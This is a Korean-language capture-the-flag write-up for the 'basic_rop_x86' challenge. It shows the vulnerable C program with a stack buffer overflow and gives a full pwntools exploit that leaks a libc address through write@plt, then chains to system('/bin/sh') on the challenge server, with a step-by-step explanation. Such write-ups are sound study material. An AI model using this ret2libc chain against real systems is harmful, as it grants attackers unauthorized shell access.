basic_rop_x86 라이트업
===============


## 분석

### 보호 기법

* 일단 적용된 보호 기법을 보면 ASLR 있고, NX있고, 카나리와 pie는 없다.
* 카나리가 없기 때문에 sfp, ret과 그 뒷 주소를 마음대로 변경해도 된다.


### 코드 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

buf 변수의 크기는 0x40이지만 read 함수에서 buf 변수에 0x400 크기의 입력을 받고 있어 버퍼 오버플로우가 발생한다.



## 익스플로잇

x64 아키텍쳐에서는 함수를 부를 때 함수의 주소와 함께 이미 레지스터에 저장되어 있는 값들을 인자로 실행되어 페이로드에 (레지스터 세팅 과정) + (함수의 주소) 형식으로 전달해준다.

그러나 x86의 경우 레지스터가 아닌 스택에서 값을 pop하여 인자로 전달하며, 순서 또한 반대로 (함수의 주소) + (pop 과정)의 형태로 페이로드를 작성해야 한다. 


### 익스플로잇 시나리오


#### 1단계: Libc 주소 Leak
스택 오버플로우를 일으켜 프로그램의 실행 흐름을 **write@plt**로 변경해서 **read@got**의 실제 주소(Libc의 read 함수 주소)를 알아낸다.


#### 2단계: 셸 따내기
1단계에서 얻은 정보(system 함수와 /bin/sh 문자열의 주소 등)를 사용한다.  ROP 체인 구성하고, 셸 따내면 된다.



### 익스플로잇 코드


```python
from pwn import *

p = remote("host8.dreamhack.games", 10074)
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")

r = ROP(e)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh_offset = list(libc.search(b"/bin/sh"))[0]

pop_ret = r.find_gadget(['pop ebp', 'ret'])[0]
pop2_ret = r.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]

payload = b'A' * 0x48
payload += p32(write_plt)
payload += p32(pop3_ret)
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(main)

p.send(payload)
p.recvuntil(b'A' * 0x40)

read = u32(p.recvn(4))
libc_base = read - read_offset
system = libc_base + system_offset
sh = libc_base + sh_offset

print(hex(libc_base))
print(hex(system))

payload = b'A' * 0x48
payload += p32(system)
payload += p32(pop_ret)
payload += p32(sh)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
```


#### 코드 분석

#### 1. 첫 번째 ROP 체인 구성 (libc 주소 leak)

* **`write_plt`:** `$RET$` 주소에 **`write@plt`** 주소를 덮어쓴다. main이 반환될 때 대신 `write` 함수가 실행된다.
* **`pop3_ret`:** `write` 함수 호출 후 스택을 정리하기 위한 ROP 가젯. 실행되면 스택에서 3개의 4바이트 값(인자 $3$개)을 pop해서 EBP, EDI, ESI$에 넣고 `ret`한다. 

#### 2. Libc 베이스 주소 계산
* `p.recvn(4)`를 통해 출력된 4 바이트(`read` 함수 주소)를 받는다.
* `libc_base = read - read_offset`을 계산하여 Libc 라이브러리가 로드된시작 주소를 구한다.
* system 함수 주소와 /bin/sh 문자열 주소를 libc_base에 오프셋을 더해서 계산한다.


#### 3. 두 번째 ROP 체인 구성 (쉘 따내기)
* **`p32(system)`:** `RET` 주소에 system 함수의 실제 주소를 덮어쓴다.
* **`p32(pop_ret)`:** system 함수 호출 후 스택을 정리하기 위한 가젯.
* **`p32(sh)`:** `system 함수의 첫 번째 인자로 `/bin/sh` 의 주소를 배치한다.


### 실행 결과

<img width="832" height="153" alt="image" src="https://github.com/user-attachments/assets/330fa515-5f63-4e53-a98f-153860ce687e" />


